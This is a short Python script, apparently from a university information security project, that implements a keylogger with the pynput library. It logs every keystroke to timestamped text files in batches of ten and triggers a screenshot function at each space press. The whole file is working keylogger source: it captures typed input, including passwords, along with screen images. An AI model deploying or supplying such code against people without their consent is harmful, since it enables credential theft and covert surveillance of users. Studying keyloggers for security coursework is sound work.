import random 
import time
import pynput
from Screenshot import * #Importing screenshot function


from pynput.keyboard import Key, Listener

count = 0
keys = []

file_name = time.strftime("%Y%m%d-%H%M%S")+".txt"


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(f"C:\\1)SLIIT\\3rd Year\\2nd Semester\\Information Security Project\\Tests\\Test 2\\Key Logs\\{file_name}", "a") as f: #save files
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                take_screenshots() #call screenshots
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
